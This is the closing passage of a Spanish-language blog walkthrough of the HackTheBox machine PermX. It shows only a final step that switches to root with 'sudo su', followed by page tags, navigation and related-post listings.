<p>5- Cambiar a superusuario:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su
</code></pre></div></div>

<ul style="text-align: justify;">
    <li><strong>sudo</strong>: Ejecuta un comando con privilegios de superusuario (root).</li>
    <li><strong>su</strong>: Cambia de usuario.</li>
</ul>
<p style="text-align: justify;">
    Este comando te cambia al usuario root, d√°ndote acceso completo a todo el sistema.
</p>


        
      </section>

      <footer class="page__meta">
        
        
  


  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Etiquetas: </strong>
    <span itemprop="keywords">
    
      <a href="/tags/#nmap" class="page__taxonomy-item p-category" rel="tag">nmap</a><span class="sep">, </span>
    
      <a href="/tags/#puerto-80" class="page__taxonomy-item p-category" rel="tag">puerto 80</a>
    
    </span>
  </p>




  


  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categor√≠as: </strong>
    <span itemprop="keywords">
    
      <a href="/categories/#hackthebox" class="page__taxonomy-item p-category" rel="tag">HackTheBox</a>
    
    </span>
  </p>


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Actualizado:</strong> <time class="dt-published" datetime="2024-07-12T00:00:00-06:00">July 12, 2024</time></p>

      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Compartir en</h4>
  

  <a href="https://twitter.com/intent/tweet?text=M%C3%A1quina+PermX+de+HackTheBox+con+dificultad+f%C3%A1cil%20http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2Fpermx%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartir en Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2Fpermx%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartir en Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/hackthebox/permx/" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartir en LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/linux/Personalizacion/" class="pagination--pager" title="Personalizaci√≥n de un entorno de trabajo Linux.
">Anterior</a>
    
    
      <a href="/linux/ArchLinux/" class="pagination--pager" title="Instalaci√≥n, configuraci√≥n y personalizaci√≥n de ArchLinux.
">Siguiente</a>
    
  </nav>

    </div>

    
  </article>

  
  
    
<div class="page__related">
  
  <h2 class="page__related-title">Puede que tambi√©n te interese</h2>
  <div class="grid__wrapper">
    
      
      



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src=
          
            "/assets/images/Snake/snake.png"
          
          alt="">
      </div>
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/python/Snake-Python/" rel="permalink">Cl√°sico juego de snake en python
</a>
        
      
    </h2>

    <p class="page__meta">
      
        <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2024-08-12T00:00:00-06:00">August 12, 2024 </time>&emsp;
      
    </p>

    <p class="archive__item-excerpt" itemprop="description"><img src="assets/images/Snake/snake.png" alt="" style="float: right;margin-right:10px; margin-left:20px; margin-bottom:10px; height:120px;">Revive la nostalgia con Snake, el cl√°sico juego de la serpiente, ahora hecho en Python! üêçüìú Disfruta de un c√≥digo simple y adictivo que crece a medida que recoges alimentos. Ideal para aprender y jugar. üöÄüéÆ
</p>
    <i class="fas fa-tags"></i>
    
      <a href="/tags/#juegos" class="page__meta btn" rel="tag">juegos</a>
    
  </article>
</div>


    
      
      



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src=
          
            "/assets/images/MaquinaGreenHorn/GreenHorn.webp"
          
          alt="">
      </div>
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/hackthebox/Maquina-GreenHorn/" rel="permalink">M√°quina GreenHorn de HackTheBox con dificultad f√°cil
</a>
        
      
    </h2>

    <p class="page__meta">
      
        <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2024-07-23T00:00:00-06:00">July 23, 2024 </time>&emsp;
      
    </p>

    <p class="archive__item-excerpt" itemprop="description"><img src="assets/images/MaquinaGreenHorn/GreenHorn.webp" alt="" style="float: right;margin-right:10px; margin-left:20px; margin-bottom:10px; height:120px;">La m√°quina GreenHorn nos muestra las posibilidades de encontrar contrase√±as incluso cuando est√°n ocultas en una imagen. Aunque esta m√°quina en s√≠ misma no representa un gran desaf√≠o, el proceso para descubrir la contrase√±a resulta ser bastante interesante y educativo.
</p>
    <i class="fas fa-tags"></i>
    
      <a href="/tags/#pixelated" class="page__meta btn" rel="tag">pixelated</a>
    
      <a href="/tags/#pluck 4.7.18" class="page__meta btn" rel="tag">pluck 4.7.18</a>
    
  </article>
</div>


    
      
      



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src=
          
            "/assets/images/ArchLinux/icons8-arch-linux-480.png"
          
          alt="">
      </div>
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/linux/ArchLinux/" rel="permalink">Instalaci√≥n, configuraci√≥n y personalizaci√≥n de ArchLinux.
</a>
        
      
    </h2>

    <p class="page__meta">
      
        <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2024-07-19T00:00:00-06:00">July 19, 2024 </time>&emsp;
      
    </p>

    <p class="archive__item-excerpt" itemprop="description"><img src="assets/images/ArchLinux/icons8-arch-linux-480.png" alt="" style="float: right;margin-right:10px; margin-left:20px; margin-bottom:10px; height:120px;">Nos sumergimos en la instalaci√≥n de Arch Linux, un proceso que puede parecer un gran reto al principio, pero que en realidad es muy sencillo. Adem√°s, la personalizaci√≥n del sistema abre un mundo de posibilidades, permiti√©ndote adaptar cada detalle a tus necesidades y preferencias.
</p>
    <i class="fas fa-tags"></i>
    
      <a href="/tags/#Linux" class="page__meta btn" rel="tag">Linux</a>
    
      <a href="/tags/#Personalizaci√≥n" class="page__meta btn" rel="tag">Personalizaci√≥n</a>
    
  </article>
</div>


    
      
      



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src=
          
            "/assets/images/PersonalizacionLinux/painter-penguin.svg"
          
          alt="">
      </div>
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/linux/Personalizacion/" rel="permalink">Personalizaci√≥n de un entorno de trabajo Linux.
</a>
        
      
    </h2>

    <p class="page__meta">
      
        <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2024-07-09T00:00:00-06:00">July 09, 2024 </time>&emsp;
      
    </p>

    <p class="archive__item-excerpt" itemprop="description"><img src="assets/images/PersonalizacionLinux/painter-penguin.svg" alt="" style="float: right;margin-right:10px; margin-left:20px; margin-bottom:10px; height:120px;">En este post es mi personalizaci√≥n personal de un sistema operativo Linux de las herramientas m√°s usadas y las m√°s c√≥modas.
</p>
    <i class="fas fa-tags"></i>
    
      <a href="/tags/#Linux" class="page__meta btn" rel="tag">Linux</a>
    
      <a href="/tags/#Personalizaci√≥n" class="page__meta btn" rel="tag">Personalizaci√≥n</a>
    
  </article>
</div>


    
  </div>
</div>

  
  
</div>

      
    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
    <label class="sr-only" for="search">
      T√©rminos de b√∫squeda...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="T√©rminos de b√∫squeda..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    
      
        
      
        
      
        
      
        
      
        
      
        
      
    

    
      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
    
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2024 <a href="http://localhost:4000">BlogPersonal</a>. </div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>






  </body>
</html>
